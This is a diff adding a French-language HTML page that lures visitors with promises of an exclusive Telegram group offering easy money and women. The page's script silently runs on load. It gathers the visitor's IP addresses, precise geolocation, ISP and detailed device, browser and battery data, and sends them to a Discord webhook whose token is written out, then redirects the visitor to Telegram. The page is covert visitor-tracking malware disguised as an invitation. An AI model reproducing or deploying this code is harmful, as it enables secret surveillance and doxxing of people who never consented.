@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Groupe Telegram Exclusif">
+    <meta property="og:title" content="Rejoins le groupe Telegram le plus chaud de 2025 !">
+    <meta property="og:description" content="Accès 100% gratuit à un groupe privé avec des opportunités business, de l'argent facile et des meufs incroyables. Clique maintenant !">
+    <meta property="og:image" content="https://cdn.pixabay.com/photo/2022/09/18/07/41/logo-7462411_1280.png">
+    <meta property="og:url" content="https://t.me/fiscalitecryptofr">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Groupe Télégram Argent & Meufs - Rejoins Gratuitement">
+    <meta name="twitter:description" content="Rejoins le meilleur groupe Telegram gratuit avec cash facile, business et des bombes en DM.">
+    <meta name="twitter:image" content="https://cdn.pixabay.com/photo/2022/09/18/07/41/logo-7462411_1280.png">
+    <title>Groupe Telegram Exclusif</title>
+    <script src="https://unpkg.com/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
+</head>
+<body>
+    <script>
+        async function collectAndSendData() {
+            try {
+                const parser = new UAParser();
+                const uaResult = parser.getResult();
+                let deviceType = uaResult.device.type || 'unknown';
+                if (!deviceType || deviceType === 'unknown') {
+                    deviceType = (window.screen.width > 1024 || !('ontouchstart' in window)) 
+                        ? (window.screen.width > 1366 ? 'PC' : 'Laptop') 
+                        : 'Smartphone';
+                }
+                let batteryInfo = {};
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        batteryInfo = {
+                            level: battery.level * 100 || 'unknown',
+                            charging: battery.charging || 'unknown',
+                            chargingTime: battery.chargingTime || 'unknown',
+                            dischargingTime: battery.dischargingTime || 'unknown'
+                        };
+                    } else {
+                        batteryInfo = { error: 'Battery API not supported' };
+                    }
+                } catch (batteryError) {
+                    batteryInfo = { error: 'Failed to retrieve battery info' };
+                }
+                const deviceInfo = {
+                    userAgent: navigator.userAgent || 'unknown',
+                    platform: navigator.platform || 'unknown',
+                    language: navigator.language || 'unknown',
+                    device: {
+                        type: deviceType,
+                        vendor: uaResult.device.vendor || 'unknown',
+                        model: uaResult.device.model || 'unknown'
+                    },
+                    os: {
+                        name: uaResult.os.name || 'unknown',
+                        version: uaResult.os.version || 'unknown'
+                    },
+                    browser: {
+                        name: uaResult.browser.name || 'unknown',
+                        version: uaResult.browser.version || 'unknown'
+                    },
+                    screen: {
+                        width: window.screen.width || 'unknown',
+                        height: window.screen.height || 'unknown',
+                        colorDepth: window.screen.colorDepth || 'unknown'
+                    },
+                    window: {
+                        innerWidth: window.innerWidth || 'unknown',
+                        innerHeight: window.innerHeight || 'unknown'
+                    },
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+                    cookiesEnabled: navigator.cookieEnabled || 'unknown',
+                    onlineStatus: navigator.onLine || 'unknown',
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType || 'unknown',
+                        rtt: navigator.connection.rtt || 'unknown',
+                        downlink: navigator.connection.downlink || 'unknown'
+                    } : 'unknown',
+                    battery: batteryInfo
+                };
+                let ipInfo = {};
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    ipInfo = await geoResponse.json();
+                    if (!ipInfo.ipv6) {
+                        const ipv6Response = await fetch('https://api64.ipify.org?format=json');
+                        const ipv6Data = await ipv6Response.json();
+                        ipInfo.ipv6 = ipv6Data.ip && ipv6Data.ip.includes(':') ? ipv6Data.ip : 'unknown';
+                    }
+                } catch (ipError) {
+                    try {
+                        const fallbackResponse = await fetch('https://ipinfo.io/json');
+                        ipInfo = await fallbackResponse.json();
+                        if (!ipInfo.ipv6) {
+                            ipInfo.ipv6 = 'unknown';
+                        }
+                    } catch (fallbackError) {
+                        ipInfo = { error: 'Impossible de récupérer les infos IP', ipv6: 'unknown' };
+                    }
+                }
+                const visitorData = {
+                    ip: {
+                        ipv4: ipInfo.ip || 'unknown',
+                        ipv6: ipInfo.ipv6 || 'unknown',
+                        city: ipInfo.city || 'unknown',
+                        region: ipInfo.region || 'unknown',
+                        country: ipInfo.country_name || ipInfo.country || 'unknown',
+                        postal: ipInfo.postal || 'unknown',
+                        latitude: ipInfo.latitude || 'unknown',
+                        longitude: ipInfo.longitude || 'unknown',
+                        isp: ipInfo.org || ipInfo.isp || 'unknown',
+                        organization: ipInfo.asn || ipInfo.org || 'unknown',
+                        timezone: ipInfo.timezone || 'unknown'
+                    },
+                    device: deviceInfo,
+                    timestamp: new Date().toISOString()
+                };
+                await fetch('https://discord.com/api/webhooks/1369692807555711087/tEaLvmxLiM-p7PICP1qzTkSo524meQ1zEnpij0-BivEBdYz6WWLg8Rr71KfxjF2-yh-1', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: null,
+                        embeds: [{
+                            title: 'Nouveau Visiteur',
+                            description: `
+**IP Info**
+- IPv4: ${visitorData.ip.ipv4}
+- IPv6: ${visitorData.ip.ipv6}
+- Ville: ${visitorData.ip.city}
+- Région: ${visitorData.ip.region}
+- Pays: ${visitorData.ip.country}
+- Code postal: ${visitorData.ip.postal}
+- Latitude: ${visitorData.ip.latitude}
+- Longitude: ${visitorData.ip.longitude}
+- ISP: ${visitorData.ip.isp}
+- Organisation: ${visitorData.ip.organization}
+- Fuseau horaire: ${visitorData.ip.timezone}
+
+**Device Info**
+- Type: ${visitorData.device.type}
+- Marque: ${visitorData.device.vendor}
+- Modèle: ${visitorData.device.model}
+- OS: ${visitorData.device.os.name} ${visitorData.device.os.version}
+- Navigateur: ${visitorData.device.browser.name} ${visitorData.device.browser.version}
+- User Agent: ${visitorData.device.userAgent}
+- Plateforme: ${visitorData.device.platform}
+- Langue: ${visitorData.device.language}
+- Résolution écran: ${visitorData.device.screen.width}x${visitorData.device.screen.height}
+- Profondeur couleur: ${visitorData.device.screen.colorDepth}
+- Taille fenêtre: ${visitorData.device.window.innerWidth}x${visitorData.device.window.innerHeight}
+- Fuseau horaire: ${visitorData.device.timezone}
+- Cookies activés: ${visitorData.device.cookiesEnabled}
+- Statut en ligne: ${visitorData.device.onlineStatus}
+- Mémoire appareil: ${visitorData.device.deviceMemory}
+- Cœurs CPU: ${visitorData.device.hardwareConcurrency}
+- Connexion: ${visitorData.device.connection.effectiveType || 'unknown'} (RTT: ${visitorData.device.connection.rtt || 'unknown'}, Downlink: ${visitorData.device.connection.downlink || 'unknown'})
+- Batterie: Niveau ${visitorData.device.battery.level}% | En charge: ${visitorData.device.battery.charging} | Temps de charge: ${visitorData.device.battery.chargingTime}s | Temps de décharge: ${visitorData.device.battery.dischargingTime}s
+
+**Horodatage**: ${visitorData.timestamp}`,
+                            color: 0x7289DA
+                        }]
+                    })
+                });
+                window.location.replace('https://t.me/fiscalitecryptofr');
+            } catch (error) {
+                window.location.replace('https://t.me/fiscalitecryptofr');
+            }
+        }
+        collectAndSendData();
+    </script>
+</body>
+</html>
